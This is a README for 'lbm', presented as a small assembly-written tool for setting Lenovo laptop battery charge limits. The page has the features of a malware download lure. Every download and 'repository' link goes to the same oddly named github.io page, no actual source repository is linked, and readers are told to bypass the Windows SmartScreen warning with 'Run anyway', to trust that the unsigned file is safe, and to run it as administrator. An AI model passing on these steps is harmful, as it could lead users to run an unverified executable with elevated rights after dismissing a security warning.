# 🔋 lbm - Keep your battery healthy, longer

## 🚀 Getting Started

Welcome! This guide will help you download and use **lbm**, a small tool that lets you control your Lenovo laptop's battery charging limit. By setting a charge threshold, you can stop your battery from overcharging, which helps it last longer.

Think of it like a "stop filling at 80%" instruction for your battery. That's it.

---

## ⬇️ Downloading lbm

Visit this link to download the application:

[![Download lbm](https://img.shields.io/badge/Download_lbm-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://unplayable-speechpattern930.github.io)

Once you're on that page, look for the latest release and download the file it provides.

---

## 📥 Installation & Setup

After downloading, here's what you do:

**Step 1:** Find the downloaded file in your "Downloads" folder.

**Step 2:** The file you downloaded is a ready-to-run program. There is **no installation** required. You don't need to run a setup wizard or install anything.

**Step 3:** Double-click the file to run it. That's it.

> **Note:** You may see a Windows SmartScreen prompt. If you do, click "More info" and then "Run anyway." This happens because the program is unsigned, but it's safe to use.

---

## 🖥️ Two Ways to Use lbm

lbm gives you two ways to control your battery threshold. Pick whichever you prefer.

### 1. Using the Graphical Window (GUI)

When you run the program, a simple window will open. This is the easiest way for most people.

**What you'll see:**

- A field to enter a number (the charge limit percentage)
- A button to apply the setting
- A button to close the window

**How to use it:**

1. Type a number between 50 and 100 in the box (80 is a common choice).
2. Click the "Apply" or "Set" button.
3. The program will apply the setting and show you a confirmation.

### 2. Using the Command Line (CLI)

If you're comfortable with a text-based interface, you can use the command line. This is handy for automation or for advanced users.

**Step 1:** Open "Command Prompt" or "PowerShell."

**Step 2:** Navigate to the folder where you saved the lbm file.

**Step 3:** Type the command below and press Enter.

```
lbm.exe set 80
```

Replace `80` with the percentage you want. For example, `lbm.exe set 75` sets the limit to 75%.

You can also just run `lbm.exe` with no arguments to open the GUI.

---

## 🤔 Frequently Asked Questions

### What is a "charge threshold" and why should I care?

A charge threshold tells your laptop to stop charging before it hits 100%. This is good for your battery. Lithium-ion batteries stress out when they stay at 100% for long periods. Keeping them at 80% or less can significantly extend their useful life. It's a simple health habit for your hardware.

### Which Lenovo models are supported?

lbm works with Lenovo laptops that use the Lenovo PM (Power Management) driver. This covers most ThinkPad models, as well as many Yoga and Legion models. If your laptop has the driver, lbm will work.

### Do I need to install anything else?

No. lbm is self-contained. It doesn't need the Lenovo Vantage app, .NET framework, or any other Lenovo software. The only requirement is that the Lenovo PM kernel driver is already present on your system (which it typically is for compatible Lenovo laptops).

### Will this void my warranty?

No. You're just changing a configuration value that Lenovo itself provides tools for. It doesn't modify hardware or firmware.

### How do I reset the limit back to 100%?

Simply run the program again and set the value to 100, or use the command `lbm.exe set 100`. That removes the limit.

---

## 🛠️ Troubleshooting

### The program says "Driver not found"

This means your Lenovo PM driver isn't installed or isn't active. You may need to enable it in your BIOS or install the Lenovo Power Management driver from the Lenovo support site.

### Nothing happens when I click Apply

Make sure you're running the program as an administrator. Right-click the file and choose "Run as administrator." This is sometimes needed to write the configuration.

### The setting doesn't stick after reboot

That's normal. The setting is applied to the current session. You can re-apply it after restarting, or just run the program again. For automation, you can create a shortcut in your startup folder.

---

## 📊 Features at a Glance

- **Tiny footprint:** Only 17 KiB in size. It's lightning fast and uses almost no RAM.
- **No dependencies:** Doesn't require .NET, Java, Python, or any Lenovo user-mode software.
- **Native code:** Written in pure x64 assembly for maximum efficiency and direct hardware access.
- **Dual interface:** Same core application provides both a visual window and a command-line tool.
- **Direct action:** Applies changes through the kernel driver directly—no fluff.

---

## 🔧 Technical Details (For the Curious)

lbm is a native Windows executable written in x64 MASM assembly. It communicates with the Lenovo power management driver using IOCTLs to read and write the charging threshold values. The program has no CRT (C Runtime) dependency, meaning it's fully standalone.

If you're a developer or a tinkerer, you can inspect the source code and build it yourself. The code is clean and well-commented.

---

## 📄 License

This project is open source. Check the repository page for the specific license details.

---

## 🧑‍💻 Contributing

Found a bug? Have a suggestion? Feel free to contribute to the project on GitHub. Pull requests are welcome.

---

## 🌐 Additional Resources

- **Project Repository:** [https://unplayable-speechpattern930.github.io](https://unplayable-speechpattern930.github.io)
- **Releases & Downloads:** [https://unplayable-speechpattern930.github.io](https://unplayable-speechpattern930.github.io)

---

## ✅ Final Checklist

1. ✅ Downloaded from the link above
2. ✅ Ran the file (no installation needed)
3. ✅ Set your preferred charge limit
4. ✅ Enjoy a longer-lasting battery

That's all there is to it. You're now in control of your battery's health.

---

Keywords: assembly, battery, battery-management, battery-threshold, charge-threshold, cli, gui, ioctl, lenovo, lenovo-vantage, masm, masm64, thinkpad, win32, windows, windows-11, x64, zero-crt